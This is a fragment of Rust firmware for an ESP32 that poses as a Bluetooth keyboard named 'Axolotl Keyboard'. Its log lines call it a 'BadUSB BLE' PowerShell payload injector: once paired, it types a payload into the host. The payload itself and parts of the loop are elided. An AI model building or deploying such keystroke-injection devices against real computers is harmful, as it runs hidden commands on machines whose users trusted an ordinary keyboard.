...
impl KeyReport {
    fn as_bytes(&self) -> [u8; 8] {
        [
            self.modifiers, self.reserved,
            self.keys[0], self.keys[1], self.keys[2],
            self.keys[3], self.keys[4], self.keys[5],
        ]
    }
}
...
pub fn run() -> anyhow::Result<()> {
    info!("=== BadUSB BLE : payload PowerShell ===");
    let keyboard = make_keyboard()?;
    info!("En attente d appairage : cherche 'Axolotl Keyboard' en Bluetooth");
    run_payload(keyboard);
    Ok(())
}

// Cree le clavier BLE et le renvoie (le menu peut afficher un ecran avant de lancer).
pub fn make_keyboard() -> anyhow::Result<Keyboard> {
    Keyboard::new()
}

// Attend l appairage puis tape le payload une seule fois.
pub fn run_payload(mut keyboard: Keyboard) {
    ...
    loop {
        if keyboard.connected() {
            if !deja_tape {
                ...
                esp_idf_svc::hal::delay::FreeRtos::delay_ms(800);
